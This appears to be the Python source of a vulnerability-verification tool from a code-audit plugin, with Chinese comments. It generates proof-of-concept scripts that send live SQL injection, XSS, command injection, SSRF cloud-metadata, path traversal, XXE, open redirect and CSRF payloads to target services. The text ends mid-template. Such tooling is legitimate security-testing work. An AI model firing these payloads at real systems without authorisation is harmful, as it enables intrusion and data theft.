#!/usr/bin/env python3
"""
POC 验证脚本生成器：根据审计发现生成可执行的 POC 验证脚本

子命令：
  generate   读取审计结果，为每个漏洞生成 POC 验证代码，输出 poc-scripts.py 和 poc-manifest.json
  run        执行 POC 验证脚本，对目标服务发送实际请求并收集验证结果

设计原则：
  - 生成的 POC 脚本是独立可执行的 Python 文件，不依赖插件运行环境
  - 支持用户配置目标服务地址、凭据等参数
  - 每个漏洞类型有对应的 POC 模板（SQL注入、XSS、SSRF、命令注入等）
  - POC 脚本仅发送探测性请求，不执行破坏性操作
  - 完整结果写入文件，stdout 仅输出 JSON 摘要供编排器解析
  - 日志信息输出到 stderr
"""
import argparse
import json
import os
import re
import sys
from datetime import datetime, timezone
from pathlib import Path
from textwrap import dedent, indent

from _common import (
    Colors, make_logger, stdout_json,
    load_json_file, write_json_file,
    normalize_finding, SEVERITY_ORDER,
)


log_info, log_ok, log_warn, log_error = make_logger('poc-gen')


# ---------------------------------------------------------------------------
# POC 模板注册表
# ---------------------------------------------------------------------------

# 每种漏洞类型对应的 POC 验证方法描述和脚本模板
# pocMethod: 人类可读的 POC 验证方式描述（会显示在报告中）
# template: Python 代码模板，占位符用 {var} 格式
# requestType: HTTP 请求类型描述

POC_TEMPLATES = {
    'sql-injection': {
        'pocMethod': 'SQL 注入差异验证：baseline 对比 + 布尔盲注真/假差异 + 时间盲注延迟 + 错误注入特征',
        'requestType': 'HTTP GET/POST',
        'template': dedent("""\
            def poc_sql_injection(base_url, path, param_name, method="GET", headers=None, cookies=None):
                \"\"\"SQL 注入 POC 验证 — 多维差异对比确认
                目标: {filePath}:{lineNumber}
                风险描述: {description}
                验证策略:
                  1) baseline: 正常值请求，记录响应指纹
                  2) 布尔盲注: AND 1=1 vs AND 1=2 — 真条件响应应≈baseline，假条件应有差异
                  3) 时间盲注: SLEEP(N) — 响应延迟应 >= N 秒（对比 baseline 延迟）
                  4) 错误注入: 单引号 — 检测 SQL 错误关键词（非通用 'error'）
                \"\"\"
                import time, hashlib, re
                url = f"{{base_url}}{{path}}"
                evidence = []
                verdict = "inconclusive"
                confirmed_techniques = []

                def _send(payload_val):
                    s = time.time()
                    try:
                        if method.upper() == "GET":
                            r = session.get(url, params={{param_name: payload_val}}, headers=headers, cookies=cookies, timeout=15, verify=False)
                        else:
                            r = session.post(url, data={{param_name: payload_val}}, headers=headers, cookies=cookies, timeout=15, verify=False)
                        return {{"status": r.status_code, "body": r.text, "length": len(r.text),
                                "elapsed": round(time.time() - s, 3),
                                "body_hash": hashlib.md5(r.text.encode()).hexdigest()}}
                    except Exception as e:
                        return {{"error": str(e), "elapsed": round(time.time() - s, 3)}}

                # ── Step 1: Baseline（正常值）──
                baseline = _send("1")
                if "error" in baseline:
                    return {{"findingId": "{findingId}", "riskType": "sql-injection",
                            "verdict": "error", "evidence": [baseline],
                            "conclusion": f"无法连接目标端点: {{baseline['error']}}"}}
                evidence.append({{"step": "baseline", "value": "1", **baseline}})

                # ── Step 2: 布尔盲注差异对比 ──
                true_cond = _send("1' AND '1'='1")
                false_cond = _send("1' AND '1'='2")
                if "error" not in true_cond and "error" not in false_cond:
                    true_matches_baseline = (
                        true_cond["status"] == baseline["status"] and
                        abs(true_cond["length"] - baseline["length"]) < max(20, baseline["length"] * 0.05)
                    )
                    false_differs = (
                        false_cond["body_hash"] != true_cond["body_hash"] and
                        (false_cond["length"] != true_cond["length"] or false_cond["status"] != true_cond["status"])
                    )
                    bool_confirmed = true_matches_baseline and false_differs
                    evidence.append({{
                        "step": "boolean_blind",
                        "true_cond": {{"value": "1' AND '1'='1", **true_cond}},
                        "false_cond": {{"value": "1' AND '1'='2", **false_cond}},
                        "true_matches_baseline": true_matches_baseline,
                        "false_differs_from_true": false_differs,
                        "confirmed": bool_confirmed,
                    }})
                    if bool_confirmed:
                        confirmed_techniques.append("布尔盲注")

                # ── Step 3: 时间盲注 ──
                sleep_payload = "1' AND SLEEP(3) AND '1'='1"
                sleep_resp = _send(sleep_payload)
                if "error" not in sleep_resp:
                    delay_delta = sleep_resp["elapsed"] - baseline["elapsed"]
                    time_confirmed = delay_delta >= 2.5
                    evidence.append({{
                        "step": "time_blind",
                        "payload": sleep_payload,
                        "baseline_elapsed": baseline["elapsed"],
                        "inject_elapsed": sleep_resp["elapsed"],
                        "delay_delta": round(delay_delta, 3),
                        "confirmed": time_confirmed,
                    }})
                    if time_confirmed:
                        confirmed_techniques.append("时间盲注(MySQL SLEEP)")

                # ── Step 4: 错误注入特征检测 ──
                sql_error_keywords = [
                    "you have an error in your sql syntax",
                    "unclosed quotation mark",
                    "quoted string not properly terminated",
                    "sqlexception", "syntax error at or near",
                    "org.hibernate", "jdbc.sqltransient",
                    "microsoft ole db", "odbc sql server driver",
                    "pg_query", "mysql_fetch",
                    "sqlite3.operationalerror",
                    "psycopg2.errors", "pymysql.err",
                ]
                error_resp = _send("1'")
                if "error" not in error_resp:
                    body_lower = error_resp["body"].lower()
                    matched_keywords = [kw for kw in sql_error_keywords if kw in body_lower]
                    # 确保 baseline 中不含这些关键词（排除误报）
                    baseline_has_keywords = any(kw in baseline["body"].lower() for kw in matched_keywords) if matched_keywords else False
                    error_confirmed = len(matched_keywords) > 0 and not baseline_has_keywords
                    evidence.append({{
                        "step": "error_based",
                        "payload": "1'",
                        "matched_sql_keywords": matched_keywords,
                        "baseline_also_has_keywords": baseline_has_keywords,
                        "confirmed": error_confirmed,
                        "response_preview": error_resp["body"][:300] if error_confirmed else "",
                    }})
                    if error_confirmed:
                        confirmed_techniques.append("错误注入")

                # ── 综合判定 ──
                if len(confirmed_techniques) >= 2:
                    verdict = "confirmed"
                    conclusion = f"漏洞已确认（{{', '.join(confirmed_techniques)}} 均验证通过）"
                elif len(confirmed_techniques) == 1:
                    verdict = "likely"
                    conclusion = f"高度疑似漏洞（{{confirmed_techniques[0]}} 验证通过，建议人工复核）"
                else:
                    verdict = "not_vulnerable"
                    conclusion = "未检测到 SQL 注入迹象（布尔盲注无差异、时间盲注无延迟、无 SQL 错误特征）"

                return {{"findingId": "{findingId}", "riskType": "sql-injection",
                        "verdict": verdict, "confirmedTechniques": confirmed_techniques,
                        "evidence": evidence, "conclusion": conclusion}}
        """),
    },
    'xss': {
        'pocMethod': 'XSS 反射验证：唯一标记反射检测 + HTML 编码分析 + Content-Type 校验 + CSP 检查',
        'requestType': 'HTTP GET/POST',
        'template': dedent("""\
            def poc_xss(base_url, path, param_name, method="GET", headers=None, cookies=None):
                \"\"\"XSS 跨站脚本 POC — 精确反射上下文验证
                目标: {filePath}:{lineNumber}
                风险描述: {description}
                \"\"\"
                url = f"{{base_url}}{{path}}"
                evidence = []
                verdict = "inconclusive"
                confirmed_vectors = []
                def _send(val):
                    try:
                        if method.upper() == "GET":
                            return session.get(url, params={{param_name: val}}, headers=headers, cookies=cookies, timeout=10, verify=False)
                        return session.post(url, data={{param_name: val}}, headers=headers, cookies=cookies, timeout=10, verify=False)
                    except:
                        return None
                # Step 1: 唯一标记检查反射 + Content-Type
                marker = "xP0C" + str(int(time.time()) % 99999)
                resp = _send(marker)
                if not resp:
                    return {{"findingId": "{findingId}", "riskType": "xss", "verdict": "error", "evidence": [], "conclusion": "无法连接目标端点"}}
                ct = resp.headers.get("Content-Type", "")
                is_html = "text/html" in ct or "text/xml" in ct
                csp = resp.headers.get("Content-Security-Policy", "")
                reflected = marker in resp.text
                evidence.append({{"step": "reflection", "marker": marker, "reflected": reflected, "content_type": ct, "is_html": is_html, "csp": csp[:200]}})
                if not reflected:
                    return {{"findingId": "{findingId}", "riskType": "xss", "verdict": "not_vulnerable", "evidence": evidence, "conclusion": "参数值未被反射到响应中"}}
                if not is_html:
                    return {{"findingId": "{findingId}", "riskType": "xss", "verdict": "not_vulnerable", "evidence": evidence, "conclusion": f"参数被反射但 Content-Type={{ct}}（非 HTML），浏览器不执行脚本"}}
                # Step 2: HTML 特殊字符编码检测
                probe = f"{{marker}}<>\\"'"
                probe_resp = _send(probe)
                if probe_resp:
                    raw_lt = f"{{marker}}<>" in probe_resp.text
                    encoded = f"{{marker}}&lt;" in probe_resp.text or f"{{marker}}&#60;" in probe_resp.text
                    evidence.append({{"step": "encoding", "raw_preserved": raw_lt, "encoded": encoded}})
                    if encoded and not raw_lt:
                        return {{"findingId": "{findingId}", "riskType": "xss", "verdict": "not_vulnerable", "evidence": evidence, "conclusion": "HTML 特殊字符已正确编码，XSS 被防御"}}
                # Step 3: 实际 payload 注入验证
                for payload, desc, check in [
                    (f"<img src=x onerror={{marker}}>", "img事件", f"<img src=x onerror={{marker}}>"),
                    (f"<svg onload={{marker}}>", "svg事件", f"<svg onload={{marker}}>"),
                ]:
                    r = _send(payload)
                    if r and check in r.text:
                        confirmed_vectors.append(desc)
                        idx = r.text.index(check)
                        evidence.append({{"step": "injection", "type": desc, "confirmed": True, "context": r.text[max(0,idx-50):idx+len(check)+50][:200]}})
                # 判定
                if confirmed_vectors:
                    csp_blocks = "script-src" in csp and "'unsafe-inline'" not in csp
                    verdict = "likely" if csp_blocks else "confirmed"
                    conclusion = f"XSS payload 原样反射到 HTML（{{', '.join(confirmed_vectors)}}）" + ("，CSP 可能阻止执行" if csp_blocks else "，无 CSP 保护")
                else:
                    verdict = "not_vulnerable"
                    conclusion = "参数被反射但 XSS payload 均被编码/过滤"
                return {{"findingId": "{findingId}", "riskType": "xss", "verdict": verdict, "confirmedVectors": confirmed_vectors, "evidence": evidence, "conclusion": conclusion}}
        """),
    },
    'command-injection': {
        'pocMethod': '命令注入验证：唯一标记 echo + baseline 对比 + 多种拼接方式交叉验证',
        'requestType': 'HTTP GET/POST',
        'template': dedent("""\
            def poc_command_injection(base_url, path, param_name, method="GET", headers=None, cookies=None):
                \"\"\"命令注入 POC — 唯一标记注入 + baseline 差异对比
                目标: {filePath}:{lineNumber}
                风险描述: {description}
                \"\"\"
                import hashlib
                url = f"{{base_url}}{{path}}"
                evidence = []
                confirmed_vectors = []
                # 生成唯一标记（确保 baseline 中不可能出现）
                marker = "CMDI_" + hashlib.md5(str(time.time()).encode()).hexdigest()[:10]
                def _send(val):
                    try:
                        if method.upper() == "GET":
                            return session.get(url, params={{param_name: val}}, headers=headers, cookies=cookies, timeout=10, verify=False)
                        return session.post(url, data={{param_name: val}}, headers=headers, cookies=cookies, timeout=10, verify=False)
                    except:
                        return None
                # Baseline
                baseline = _send("normalvalue")
                if not baseline:
                    return {{"findingId": "{findingId}", "riskType": "command-injection", "verdict": "error", "evidence": [], "conclusion": "无法连接目标端点"}}
                baseline_has_marker = marker in baseline.text
                evidence.append({{"step": "baseline", "status": baseline.status_code, "length": len(baseline.text), "marker_in_baseline": baseline_has_marker}})
                if baseline_has_marker:
                    return {{"findingId": "{findingId}", "riskType": "command-injection", "verdict": "error", "evidence": evidence, "conclusion": "唯一标记意外出现在 baseline 中，测试无效"}}
                # 多种拼接方式注入
                for payload, desc in [
                    (f"normalvalue; echo {{marker}}", "分号拼接"),
                    (f"normalvalue| echo {{marker}}", "管道拼接"),
                    (f"normalvalue$(echo {{marker}})", "命令替换"),
                    (f"normalvalue`echo {{marker}}`", "反引号替换"),
                ]:
                    resp = _send(payload)
                    if resp and marker in resp.text:
                        confirmed_vectors.append(desc)
                        idx = resp.text.index(marker)
                        evidence.append({{"step": "injection", "type": desc, "payload": payload, "confirmed": True,
                                         "context": resp.text[max(0,idx-30):idx+len(marker)+30][:200]}})
                    elif resp:
                        evidence.append({{"step": "injection", "type": desc, "confirmed": False, "status": resp.status_code}})
                # 判定
                if len(confirmed_vectors) >= 2:
                    verdict = "confirmed"
                    conclusion = f"命令注入已确认（{{', '.join(confirmed_vectors)}} 均成功回显标记）"
                elif len(confirmed_vectors) == 1:
                    verdict = "likely"
                    conclusion = f"高度疑似命令注入（{{confirmed_vectors[0]}} 回显标记，建议人工复核）"
                else:
                    verdict = "not_vulnerable"
                    conclusion = "所有注入 payload 均未在响应中回显标记"
                return {{"findingId": "{findingId}", "riskType": "command-injection", "verdict": verdict, "confirmedVectors": confirmed_vectors, "evidence": evidence, "conclusion": conclusion}}
        """),
    },
    'ssrf': {
        'pocMethod': 'SSRF 验证：baseline 对比 + 云元数据特征检测 + 响应差异分析 + 带外回调',
        'requestType': 'HTTP GET/POST',
        'template': dedent("""\
            def poc_ssrf(base_url, path, param_name, method="GET", headers=None, cookies=None, callback_url=None):
                \"\"\"SSRF 服务端请求伪造 POC — baseline 差异对比 + 元数据指纹
                目标: {filePath}:{lineNumber}
                风险描述: {description}
                \"\"\"
                url = f"{{base_url}}{{path}}"
                evidence = []
                confirmed_vectors = []
                def _send(val):
                    try:
                        if method.upper() == "GET":
                            return session.get(url, params={{param_name: val}}, headers=headers, cookies=cookies, timeout=10, verify=False, allow_redirects=False)
                        return session.post(url, json={{param_name: val}}, headers=headers, cookies=cookies, timeout=10, verify=False, allow_redirects=False)
                    except:
                        return None
                # Baseline: 正常外部 URL
                baseline = _send("https://httpbin.org/status/200")
                invalid = _send("https://thisdomaindoesnotexist12345.invalid/")
                if not baseline:
                    return {{"findingId": "{findingId}", "riskType": "ssrf", "verdict": "error", "evidence": [], "conclusion": "无法连接目标端点"}}
                evidence.append({{"step": "baseline", "valid_url_status": baseline.status_code, "valid_url_length": len(baseline.text),
                                 "invalid_url_status": invalid.status_code if invalid else "error", "invalid_url_length": len(invalid.text) if invalid else 0}})
                # 关键判断：如果正常URL和无效URL的响应完全一样，说明服务端没有实际发起请求
                baseline_matches_invalid = invalid and baseline.status_code == invalid.status_code and abs(len(baseline.text) - len(invalid.text)) < 20
                # IMDS 元数据探测 — 检测响应中是否包含云元数据特征内容
                imds_targets = [
                    ("http://169.254.169.254/latest/meta-data/", "AWS IMDS", ["ami-id", "instance-id", "security-credentials", "iam"]),
                    ("http://metadata.tencentyun.com/latest/meta-data/", "腾讯云 IMDS", ["instance-id", "placement", "cam", "security-credentials"]),
                    ("http://100.100.100.200/latest/meta-data/", "阿里云 IMDS", ["instance-id", "eipAddress", "image-id"]),
                ]
                for target_url, desc, fingerprints in imds_targets:
                    resp = _send(target_url)
                    if resp:
                        body = resp.text.lower()
                        matched_fp = [fp for fp in fingerprints if fp.lower() in body]
                        is_ssrf = len(matched_fp) >= 1 and resp.status_code == 200
                        if is_ssrf:
                            confirmed_vectors.append(desc)
                        evidence.append({{"step": "imds", "target": target_url, "type": desc,
                                         "status": resp.status_code, "length": len(resp.text),
                                         "matched_fingerprints": matched_fp, "confirmed": is_ssrf,
                                         "preview": resp.text[:300] if is_ssrf else ""}})
                # 内网回环探测 — 对比 baseline 检查响应差异
                for target_url, desc in [("http://127.0.0.1/", "本地回环"), ("http://[::1]/", "IPv6回环")]:
                    resp = _send(target_url)
                    if resp:
                        differs_from_invalid = invalid and (resp.status_code != invalid.status_code or abs(len(resp.text) - len(invalid.text)) > 50)
                        has_server_content = resp.status_code == 200 and len(resp.text) > 50
                        is_ssrf = differs_from_invalid and has_server_content and not baseline_matches_invalid
                        evidence.append({{"step": "loopback", "target": target_url, "type": desc,
                                         "status": resp.status_code, "length": len(resp.text),
                                         "differs_from_invalid_url": differs_from_invalid, "confirmed": is_ssrf}})
                        if is_ssrf:
                            confirmed_vectors.append(desc)
                if callback_url:
                    resp = _send(callback_url)
                    evidence.append({{"step": "oob", "callback_url": callback_url, "status": resp.status_code if resp else "error", "note": "请检查回调服务器是否收到请求"}})
                # 判定
                if confirmed_vectors:
                    verdict = "confirmed"
                    conclusion = f"SSRF 漏洞已确认（{{', '.join(confirmed_vectors)}}），服务端实际发起了内网/元数据请求"
                elif baseline_matches_invalid:
                    verdict = "not_vulnerable"
                    conclusion = "有效URL和无效URL响应一致，服务端未实际发起请求（可能仅做字段存储）"
                else:
                    verdict = "inconclusive"
                    conclusion = "未检测到明确的 SSRF 证据，建议使用带外回调（--callback-url）进一步验证"
                return {{"findingId": "{findingId}", "riskType": "ssrf", "verdict": verdict, "confirmedVectors": confirmed_vectors, "evidence": evidence, "conclusion": conclusion}}
        """),
    },
    'path-traversal': {
        'pocMethod': '路径遍历验证：已知文件指纹匹配 + baseline 差异对比 + 多编码绕过',
        'requestType': 'HTTP GET/POST',
        'template': dedent("""\
            def poc_path_traversal(base_url, path, param_name, method="GET", headers=None, cookies=None):
                \"\"\"路径遍历 POC — 已知文件指纹验证 + baseline 对比
                目标: {filePath}:{lineNumber}
                风险描述: {description}
                \"\"\"
                import re
                url = f"{{base_url}}{{path}}"
                evidence = []
                confirmed_vectors = []
                def _send(val):
                    try:
                        if method.upper() == "GET":
                            return session.get(url, params={{param_name: val}}, headers=headers, cookies=cookies, timeout=10, verify=False)
                        return session.post(url, data={{param_name: val}}, headers=headers, cookies=cookies, timeout=10, verify=False)
                    except:
                        return None
                # Baseline: 正常文件名
                baseline = _send("index.html")
                if not baseline:
                    return {{"findingId": "{findingId}", "riskType": "path-traversal", "verdict": "error", "evidence": [], "conclusion": "无法连接目标端点"}}
                evidence.append({{"step": "baseline", "status": baseline.status_code, "length": len(baseline.text)}})
                # /etc/passwd 指纹: 至少包含 root:x:0:0 或 root:*:0:0 格式
                passwd_pattern = re.compile(r"root:[x*]:0:0:")
                for payload, desc in [
                    ("../../../etc/passwd", "基础遍历"),
                    ("....//....//....//etc/passwd", "双写绕过"),
                    ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "URL编码"),
                    ("..%252f..%252f..%252fetc%252fpasswd", "双重编码"),
                    ("..\\\\..\\\\..\\\\etc\\\\passwd", "反斜杠"),
                ]:
                    resp = _send(payload)
                    if resp:
                        has_passwd_fmt = bool(passwd_pattern.search(resp.text))
                        # 排除 baseline 中已包含该内容的情况
                        baseline_also_has = bool(passwd_pattern.search(baseline.text))
                        confirmed = has_passwd_fmt and not baseline_also_has
                        if confirmed:
                            confirmed_vectors.append(desc)
                        evidence.append({{"step": "traversal", "type": desc, "payload": payload,
                                         "status": resp.status_code, "length": len(resp.text),
                                         "passwd_format_found": has_passwd_fmt, "confirmed": confirmed,
                                         "preview": resp.text[:200] if confirmed else ""}})
                # 判定
                if confirmed_vectors:
                    verdict = "confirmed"
                    conclusion = f"路径遍历已确认: 成功读取 /etc/passwd（{{', '.join(confirmed_vectors)}}），文件内容匹配 passwd 格式"
                else:
                    verdict = "not_vulnerable"
                    conclusion = "所有遍历 payload 均未返回有效的 /etc/passwd 内容"
                return {{"findingId": "{findingId}", "riskType": "path-traversal", "verdict": verdict, "confirmedVectors": confirmed_vectors, "evidence": evidence, "conclusion": conclusion}}
        """),
    },
    'idor': {
        'pocMethod': 'IDOR 越权验证：认证用户 vs 匿名用户对比 + 跨 ID 数据泄露检测 + 权限边界测试',
        'requestType': 'HTTP GET/POST',
        'template': dedent("""\
            def poc_idor(base_url, path, param_name, method="GET", headers=None, cookies=None):
                \"\"\"IDOR 越权访问 POC — 认证对比 + 跨 ID 数据泄露检测
                目标: {filePath}:{lineNumber}
                风险描述: {description}
                \"\"\"
                url = f"{{base_url}}{{path}}"
                evidence = []
                verdict = "inconclusive"
                def _send_auth(val):
                    try:
                        if method.upper() == "GET":
                            return session.get(url, params={{param_name: val}}, headers=headers, cookies=cookies, timeout=10, verify=False)
                        return session.post(url, data={{param_name: val}}, headers=headers, cookies=cookies, timeout=10, verify=False)
                    except:
                        return None
                def _send_anon(val):
                    try:
                        anon = requests.Session()
                        if method.upper() == "GET":
                            return anon.get(url, params={{param_name: val}}, timeout=10, verify=False)
                        return anon.post(url, data={{param_name: val}}, timeout=10, verify=False)
                    except:
                        return None
                # 测试1: 认证用户访问不同 ID — 检查是否返回不同用户数据
                test_ids = ["1", "2", "999"]
                auth_responses = {{}}
                for tid in test_ids:
                    resp = _send_auth(tid)
                    if resp:
                        auth_responses[tid] = {{"status": resp.status_code, "length": len(resp.text), "body_sample": resp.text[:100]}}
                evidence.append({{"step": "cross_id_access", "ids_tested": test_ids, "responses": auth_responses}})
                # 判断：如果多个不同 ID 都返回 200 且内容有差异，说明可以访问不同资源（但需进一步确认是越权）
                ok_responses = [v for v in auth_responses.values() if v["status"] == 200 and v["length"] > 20]
                multiple_resources = len(ok_responses) >= 2 and len(set(v["body_sample"] for v in ok_responses)) >= 2
                # 测试2: 匿名用户是否也能访问 — 判断是否缺少认证
                anon_resp = _send_anon("1")
                auth_resp = _send_auth("1")
                anon_gets_data = False
                if anon_resp and auth_resp:
                    anon_gets_data = (anon_resp.status_code == 200 and len(anon_resp.text) > 20 and
                                      anon_resp.status_code not in (401, 403))
                    evidence.append({{"step": "anon_vs_auth",
                                     "anon_status": anon_resp.status_code, "anon_length": len(anon_resp.text),
                                     "auth_status": auth_resp.status_code, "auth_length": len(auth_resp.text),
                                     "anon_can_access": anon_gets_data}})
                # 测试3: 越界 ID（负数、0、超大值）
                boundary_evidence = []
                for tid in ["0", "-1", "99999999"]:
                    resp = _send_auth(tid)
                    if resp and resp.status_code == 200 and len(resp.text) > 20:
                        boundary_evidence.append({{"id": tid, "status": resp.status_code, "length": len(resp.text)}})
                if boundary_evidence:
                    evidence.append({{"step": "boundary_ids", "accessible": boundary_evidence}})
                # 判定
                if anon_gets_data and multiple_resources:
                    verdict = "confirmed"
                    conclusion = "IDOR 已确认: 匿名用户可通过枚举 ID 访问不同资源的数据"
                elif multiple_resources and boundary_evidence:
                    verdict = "likely"
                    conclusion = "高度疑似 IDOR: 可访问多个不同资源且越界 ID 未被拒绝（需确认当前用户是否为资源所有者）"
                elif multiple_resources:
                    verdict = "inconclusive"
                    conclusion = "可访问多个 ID 的资源，但无法自动判断是否为越权（需人工确认当前用户权限范围）"
                else:
                    verdict = "not_vulnerable"
                    conclusion = "未检测到 IDOR 迹象（无法访问多个不同资源或端点需要认证）"
                return {{"findingId": "{findingId}", "riskType": "idor", "verdict": verdict, "evidence": evidence, "conclusion": conclusion}}
        """),
    },
    'open-redirect': {
        'pocMethod': '开放重定向验证：Location 头域名控制检测 + 多绕过方式 + baseline 对比',
        'requestType': 'HTTP GET',
        'template': dedent("""\
            def poc_open_redirect(base_url, path, param_name, method="GET", headers=None, cookies=None):
                \"\"\"开放重定向 POC — Location 头精确域名验证
                目标: {filePath}:{lineNumber}
                风险描述: {description}
                \"\"\"
                from urllib.parse import urlparse
                url = f"{{base_url}}{{path}}"
                evidence = []
                confirmed_vectors = []
                def _send(val):
                    try:
                        return session.get(url, params={{param_name: val}}, headers=headers, cookies=cookies, timeout=10, verify=False, allow_redirects=False)
                    except:
                        return None
                # Baseline: 内部路径
                baseline = _send("/dashboard")
                if baseline:
                    evidence.append({{"step": "baseline", "status": baseline.status_code, "location": baseline.headers.get("Location", "")}})
                for payload, desc in [
                    ("https://evil.example.com", "直接外部URL"),
                    ("//evil.example.com", "协议相对URL"),
                    ("https://target.com@evil.example.com", "@符号绕过"),
                    ("/\\\\evil.example.com", "反斜杠绕过"),
                ]:
                    resp = _send(payload)
                    if resp:
                        location = resp.headers.get("Location", "")
                        is_redirect = resp.status_code in (301, 302, 303, 307, 308)
                        # 精确检查: Location 的域名是否被控制为 evil.example.com
                        if is_redirect and location:
                            parsed = urlparse(location)
                            domain_controlled = "evil.example.com" in (parsed.netloc or parsed.path)
                        else:
                            domain_controlled = False
                        if is_redirect and domain_controlled:
                            confirmed_vectors.append(desc)
                        evidence.append({{"step": "redirect", "type": desc, "payload": payload,
                                         "status": resp.status_code, "location": location,
                                         "is_redirect": is_redirect, "domain_controlled": domain_controlled,
                                         "confirmed": is_redirect and domain_controlled}})
                if confirmed_vectors:
                    verdict = "confirmed"
                    conclusion = f"开放重定向已确认: 可将用户重定向到攻击者域名（{{', '.join(confirmed_vectors)}}）"
                else:
                    verdict = "not_vulnerable"
                    conclusion = "所有外部 URL 均未被重定向或 Location 域名未被控制"
                return {{"findingId": "{findingId}", "riskType": "open-redirect", "verdict": verdict, "confirmedVectors": confirmed_vectors, "evidence": evidence, "conclusion": conclusion}}
        """),
    },
    'xxe': {
        'pocMethod': 'XXE 验证：外部实体文件读取 + 已知文件指纹匹配 + baseline 对比',
        'requestType': 'HTTP POST (XML)',
        'template': dedent("""\
            def poc_xxe(base_url, path, headers=None, cookies=None, callback_url=None):
                \"\"\"XXE 外部实体注入 POC — 文件指纹验证
                目标: {filePath}:{lineNumber}
                风险描述: {description}
                \"\"\"
                import re
                url = f"{{base_url}}{{path}}"
                evidence = []
                confirmed_vectors = []
                xml_headers = dict(headers or {{}})
                xml_headers["Content-Type"] = "application/xml"
                passwd_pattern = re.compile(r"root:[x*]:0:0:")
                # Baseline: 正常 XML
                try:
                    baseline = session.post(url, data='<?xml version="1.0"?><root>test</root>', headers=xml_headers, cookies=cookies, timeout=10, verify=False)
                    evidence.append({{"step": "baseline", "status": baseline.status_code, "length": len(baseline.text)}})
                except:
                    return {{"findingId": "{findingId}", "riskType": "xxe", "verdict": "error", "evidence": [], "conclusion": "无法连接目标端点"}}
                baseline_has_passwd = bool(passwd_pattern.search(baseline.text))
                # 文件读取 payload
                for entity_file, desc in [("/etc/hostname", "hostname"), ("/etc/passwd", "passwd")]:
                    payload = f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{{entity_file}}">]><root>&xxe;</root>'
                    try:
                        resp = session.post(url, data=payload, headers=xml_headers, cookies=cookies, timeout=10, verify=False)
                        if desc == "passwd":
                            has_content = bool(passwd_pattern.search(resp.text)) and not baseline_has_passwd
                        else:
                            has_content = resp.status_code == 200 and len(resp.text) != len(baseline.text) and len(resp.text) > len(baseline.text)
                        if has_content:
                            confirmed_vectors.append(f"文件读取({{entity_file}})")
                        evidence.append({{"step": "file_read", "file": entity_file, "type": desc,
                                         "status": resp.status_code, "length": len(resp.text),
                                         "file_content_found": has_content, "confirmed": has_content,
                                         "preview": resp.text[:300] if has_content else ""}})
                    except Exception as e:
                        evidence.append({{"step": "file_read", "file": entity_file, "error": str(e)}})
                if callback_url:
                    try:
                        payload = f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{{callback_url}}">]><root>&xxe;</root>'
                        resp = session.post(url, data=payload, headers=xml_headers, cookies=cookies, timeout=10, verify=False)
                        evidence.append({{"step": "oob", "callback": callback_url, "status": resp.status_code, "note": "请检查回调服务器"}})
                    except:
                        pass
                if confirmed_vectors:
                    verdict = "confirmed"
                    conclusion = f"XXE 漏洞已确认: 成功通过外部实体读取服务器文件（{{', '.join(confirmed_vectors)}}）"
                else:
                    verdict = "not_vulnerable"
                    conclusion = "XML 外部实体未被解析或文件读取失败"
                return {{"findingId": "{findingId}", "riskType": "xxe", "verdict": verdict, "confirmedVectors": confirmed_vectors, "evidence": evidence, "conclusion": conclusion}}
        """),
    },
    'csrf': {
        'pocMethod': 'CSRF 验证：正常请求 vs 无 token 请求对比 + 跨域 Origin 检测 + 状态变更确认',
        'requestType': 'HTTP POST',
        'template': dedent("""\
            def poc_csrf(base_url, path, form_data=None, headers=None, cookies=None):
                \"\"\"CSRF 跨站请求伪造 POC — 多维对比验证
                目标: {filePath}:{lineNumber}
                风险描述: {description}
                \"\"\"
                url = f"{{base_url}}{{path}}"
                evidence = []
                verdict = "inconclusive"
                data = form_data or {{"test": "csrf_poc_value"}}
                # Step 1: 正常请求（带原始 headers + cookies）作为 baseline
                try:
                    normal_resp = session.post(url, data=data, headers=headers, cookies=cookies, timeout=10, verify=False)
                    evidence.append({{"step": "normal_request", "status": normal_resp.status_code, "length": len(normal_resp.text)}})
                except:
                    return {{"findingId": "{findingId}", "riskType": "csrf", "verdict": "error", "evidence": [], "conclusion": "无法连接目标端点"}}
                # Step 2: 不带 CSRF token 但带 cookies（模拟跨域自动携带 cookie）
                cross_headers = dict(headers or {{}})
                for token_name in ["X-CSRF-Token", "X-XSRF-Token", "X-CSRFToken", "csrf-token"]:
                    cross_headers.pop(token_name, None)
                cross_headers["Origin"] = "https://evil.example.com"
                cross_headers["Referer"] = "https://evil.example.com/attack.html"
                try:
                    cross_resp = session.post(url, data=data, headers=cross_headers, cookies=cookies, timeout=10, verify=False)
                    # 判断：如果跨域无 token 请求也返回成功（2xx），且和正常请求结果类似
                    cross_accepted = cross_resp.status_code in (200, 201, 204, 302)
                    normal_also_ok = normal_resp.status_code in (200, 201, 204, 302)
                    # 关键: 服务端是否在 cross 请求中设置了新的 CSRF cookie（说明有 CSRF 保护框架）
                    has_csrf_cookie = any("csrf" in c.lower() for c in cross_resp.headers.get("Set-Cookie", "").split(";"))
                    evidence.append({{"step": "cross_origin_no_token",
                                     "status": cross_resp.status_code, "length": len(cross_resp.text),
                                     "request_accepted": cross_accepted,
                                     "csrf_cookie_set": has_csrf_cookie}})
                except Exception as e:
                    evidence.append({{"step": "cross_origin_no_token", "error": str(e)}})
                    cross_accepted = False
                    has_csrf_cookie = False
                # Step 3: 完全匿名请求（无 cookie 无 token）
                try:
                    anon = requests.Session()
                    anon_resp = anon.post(url, data=data, timeout=10, verify=False)
                    anon_needs_auth = anon_resp.status_code in (401, 403)
                    evidence.append({{"step": "anon_request", "status": anon_resp.status_code, "needs_auth": anon_needs_auth}})
                except Exception as e:
                    evidence.append({{"step": "anon_request", "error": str(e)}})
                    anon_needs_auth = True
                # 判定
                if cross_accepted and not has_csrf_cookie and normal_also_ok:
                    if anon_needs_auth:
                        verdict = "confirmed"
                        conclusion = "CSRF 漏洞已确认: 端点需要认证但接受无 CSRF token 的跨域请求（浏览器会自动携带 cookie）"
                    else:
                        verdict = "likely"
                        conclusion = "疑似 CSRF: 端点接受无 CSRF token 的跨域请求（需确认该操作是否有副作用/状态变更）"
                elif has_csrf_cookie:
                    verdict = "not_vulnerable"
                    conclusion = "服务端设置了 CSRF cookie，具有 CSRF 保护机制"
                elif not cross_accepted:
                    verdict = "not_vulnerable"
